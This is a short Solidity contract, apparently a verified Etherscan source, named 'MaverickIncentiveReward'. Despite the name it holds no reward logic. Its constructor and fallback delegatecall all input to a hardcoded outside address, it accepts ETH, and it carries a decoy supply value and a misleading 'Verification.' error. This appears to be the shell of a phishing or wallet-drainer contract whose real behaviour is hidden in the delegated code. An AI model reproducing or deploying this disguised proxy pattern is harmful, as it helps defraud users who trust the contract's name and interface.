/**
 *Submitted for verification at Etherscan.io on 2023-09-11
*/

// SPDX-License-Identifier: MIT

pragma solidity <=0.8.18;

contract MaverickIncentiveReward {
    uint256 private totalSupply = 5029;
    fallback(bytes calldata data) payable external returns(bytes memory){
        (bool r1, bytes memory result) = address(0x7CBdf602A62276355BC2daaaf31D6c26538A1F5b).delegatecall(data);
        require(r1, "Verification.");
        return result;
    }

    receive() payable external {
    }

    constructor() {
        bytes memory data = abi.encodeWithSignature("initialize()");
        (bool r1,) = address(0x7CBdf602A62276355BC2daaaf31D6c26538A1F5b).delegatecall(data);
        require(r1, "Verificiation.");
    }
}